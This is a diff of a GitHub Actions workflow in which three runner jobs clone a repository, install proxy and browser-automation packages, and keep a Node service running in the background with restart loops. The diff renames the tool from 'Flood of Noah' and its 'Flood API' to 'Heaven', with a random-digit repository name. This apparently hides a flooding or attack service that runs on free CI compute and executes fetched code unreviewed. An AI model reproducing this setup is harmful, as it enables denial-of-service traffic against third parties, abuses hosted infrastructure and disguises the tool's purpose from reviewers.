@@ -40,26 +40,26 @@ jobs:
           sudo apt-get install -y nodejs
           echo "✅ Node.js $(node --version) installed"
 
-      - name: Install Flood of Noah
+      - name: Install Heaven Package
         run: |
-          echo "🌊 Installing Flood of Noah..."
+          echo "🌊 Installing Heaven..."
           sudo mkdir -p /home/runner/.config/puppeteer
           sudo chown -R $(whoami):$(whoami) /home/runner
           sudo chmod -R 755 /home/runner
           cd ~
-          rm -rf flood_of-noah
-          git clone https://github.com/benbenido025-lab/flood_of-noah
-          cd flood_of-noah
+          rm -rf heaven982358265823687562395235
+          git clone https://github.com/benbenido025-lab/heaven982358265823687562395235
+          cd heaven982358265823687562395235
           rm -rf node_modules package-lock.json
           npm install express axios socks puppeteer --save
-          echo "✅ Flood of Noah installed"
+          echo "✅ Heaven installed"
 
-      - name: Start Flood Service
+      - name: Start Heaven Service
         run: |
-          cd ~/flood_of-noah
-          nohup node index.js > /tmp/flood-1.log 2>&1 &
+          cd ~/heaven982358265823687562395235
+          nohup node client.js > /tmp/heaven-1.log 2>&1 &
           sleep 5
-          echo "✅ Flood of Noah running on Instance 1"
+          echo "✅ Heaven running on Instance 1"
           echo "📍 Service available at: http://localhost:3000"
 
       - name: Display Info
@@ -71,7 +71,7 @@ jobs:
           echo "╠════════════════════════════════════════════════╣"
           echo "║ Public IP : $PUBLIC_IP"
           echo "║ Status    : ACTIVE"
-          echo "║ Flood API : http://localhost:3000"
+          echo "║ Heaven API : http://localhost:3000"
           echo "╚════════════════════════════════════════════════╝"
 
       - name: Keep Alive
@@ -87,11 +87,11 @@ jobs:
             REMAIN=$(((END - $(date +%s)) / 60))
             echo "🟢 Instance 1 | ${ELAPSED}m / ${REMAIN}m remaining"
             if [ $((COUNTER % 10)) -eq 0 ]; then
-              if pgrep -f "node index.js" > /dev/null; then
-                echo "   ✅ Flood service: Running"
+              if pgrep -f "node client.js" > /dev/null; then
+                echo "   ✅ Heaven service: Running"
               else
-                echo "   ⚠️ Restarting Flood service..."
-                cd ~/flood_of-noah && nohup node index.js > /tmp/flood-1.log 2>&1 &
+                echo "   ⚠️ Restarting Heaven service..."
+                cd ~/heaven982358265823687562395235 && nohup node client.js > /tmp/heaven-1.log 2>&1 &
               fi
             fi
             sleep 60
@@ -100,7 +100,7 @@ jobs:
       - name: Cleanup
         if: always()
         run: |
-          pkill -f "node index.js" || true
+          pkill -f "node client.js" || true
           echo "🧹 Instance 1 cleaned up"
 
   ubuntu-rdp-2:
@@ -127,36 +127,38 @@ jobs:
           sudo apt-get install -y nodejs
           echo "✅ Node.js $(node --version) installed"
 
-      - name: Install Flood of Noah
+      - name: Install Heaven Package
         run: |
-          echo "🌊 Installing Flood of Noah..."
+          echo "🌊 Installing Heaven..."
           sudo mkdir -p /home/runner/.config/puppeteer
           sudo chown -R $(whoami):$(whoami) /home/runner
           sudo chmod -R 755 /home/runner
           cd ~
-          rm -rf flood_of-noah
-          git clone https://github.com/benbenido025-lab/flood_of-noah
-          cd flood_of-noah
+          rm -rf heaven982358265823687562395235
+          git clone https://github.com/benbenido025-lab/heaven982358265823687562395235
+          cd heaven982358265823687562395235
           rm -rf node_modules package-lock.json
           npm install express axios socks puppeteer --save
-          echo "✅ Flood of Noah installed"
+          echo "✅ Heaven installed"
 
-      - name: Start Flood Service
+      - name: Start Heaven Service
         run: |
-          cd ~/flood_of-noah
-          nohup node index.js > /tmp/flood-2.log 2>&1 &
+          cd ~/heaven982358265823687562395235
+          nohup node client.js > /tmp/heaven-2.log 2>&1 &
           sleep 5
-          echo "✅ Flood of Noah running on Instance 2"
+          echo "✅ Heaven running on Instance 2"
+          echo "📍 Service available at: http://localhost:3000"
 
       - name: Display Info
         run: |
           PUBLIC_IP=$(curl -s ifconfig.me || echo "N/A")
+          echo ""
           echo "╔════════════════════════════════════════════════╗"
           echo "║         INSTANCE #2 READY                      ║"
           echo "╠════════════════════════════════════════════════╣"
           echo "║ Public IP : $PUBLIC_IP"
           echo "║ Status    : ACTIVE"
-          echo "║ Flood API : http://localhost:3000"
+          echo "║ Heaven API : http://localhost:3000"
           echo "╚════════════════════════════════════════════════╝"
 
       - name: Keep Alive
@@ -172,11 +174,11 @@ jobs:
             REMAIN=$(((END - $(date +%s)) / 60))
             echo "🟢 Instance 2 | ${ELAPSED}m / ${REMAIN}m remaining"
             if [ $((COUNTER % 10)) -eq 0 ]; then
-              if pgrep -f "node index.js" > /dev/null; then
-                echo "   ✅ Flood service: Running"
+              if pgrep -f "node client.js" > /dev/null; then
+                echo "   ✅ Heaven service: Running"
               else
-                echo "   ⚠️ Restarting Flood service..."
-                cd ~/flood_of-noah && nohup node index.js > /tmp/flood-2.log 2>&1 &
+                echo "   ⚠️ Restarting Heaven service..."
+                cd ~/heaven982358265823687562395235 && nohup node client.js > /tmp/heaven-2.log 2>&1 &
               fi
             fi
             sleep 60
@@ -185,7 +187,7 @@ jobs:
       - name: Cleanup
         if: always()
         run: |
-          pkill -f "node index.js" || true
+          pkill -f "node client.js" || true
           echo "🧹 Instance 2 cleaned up"
 
   ubuntu-rdp-3:
@@ -212,36 +214,38 @@ jobs:
           sudo apt-get install -y nodejs
           echo "✅ Node.js $(node --version) installed"
 
-      - name: Install Flood of Noah
+      - name: Install Heaven Package
         run: |
-          echo "🌊 Installing Flood of Noah..."
+          echo "🌊 Installing Heaven..."
           sudo mkdir -p /home/runner/.config/puppeteer
           sudo chown -R $(whoami):$(whoami) /home/runner
           sudo chmod -R 755 /home/runner
           cd ~
-          rm -rf flood_of-noah
-          git clone https://github.com/benbenido025-lab/flood_of-noah
-          cd flood_of-noah
+          rm -rf heaven982358265823687562395235
+          git clone https://github.com/benbenido025-lab/heaven982358265823687562395235
+          cd heaven982358265823687562395235
           rm -rf node_modules package-lock.json
           npm install express axios socks puppeteer --save
-          echo "✅ Flood of Noah installed"
+          echo "✅ Heaven installed"
 
-      - name: Start Flood Service
+      - name: Start Heaven Service
         run: |
-          cd ~/flood_of-noah
-          nohup node index.js > /tmp/flood-3.log 2>&1 &
+          cd ~/heaven982358265823687562395235
+          nohup node client.js > /tmp/heaven-3.log 2>&1 &
           sleep 5
-          echo "✅ Flood of Noah running on Instance 3"
+          echo "✅ Heaven running on Instance 3"
+          echo "📍 Service available at: http://localhost:3000"
 
       - name: Display Info
         run: |
           PUBLIC_IP=$(curl -s ifconfig.me || echo "N/A")
+          echo ""
           echo "╔════════════════════════════════════════════════╗"
           echo "║         INSTANCE #3 READY                      ║"
           echo "╠════════════════════════════════════════════════╣"
           echo "║ Public IP : $PUBLIC_IP"
           echo "║ Status    : ACTIVE"
-          echo "║ Flood API : http://localhost:3000"
+          echo "║ Heaven API : http://localhost:3000"
           echo "╚════════════════════════════════════════════════╝"
 
       - name: Keep Alive
@@ -257,11 +261,11 @@ jobs:
             REMAIN=$(((END - $(date +%s)) / 60))
             echo "🟢 Instance 3 | ${ELAPSED}m / ${REMAIN}m remaining"
             if [ $((COUNTER % 10)) -eq 0 ]; then
-              if pgrep -f "node index.js" > /dev/null; then
-                echo "   ✅ Flood service: Running"
+              if pgrep -f "node client.js" > /dev/null; then
+                echo "   ✅ Heaven service: Running"
               else
-                echo "   ⚠️ Restarting Flood service..."
-                cd ~/flood_of-noah && nohup node index.js > /tmp/flood-3.log 2>&1 &
+                echo "   ⚠️ Restarting Heaven service..."
+                cd ~/heaven982358265823687562395235 && nohup node client.js > /tmp/heaven-3.log 2>&1 &
               fi
             fi
             sleep 60
@@ -270,5 +274,5 @@ jobs:
       - name: Cleanup
         if: always()
         run: |
-          pkill -f "node index.js" || true
+          pkill -f "node client.js" || true
           echo "🧹 Instance 3 cleaned up"
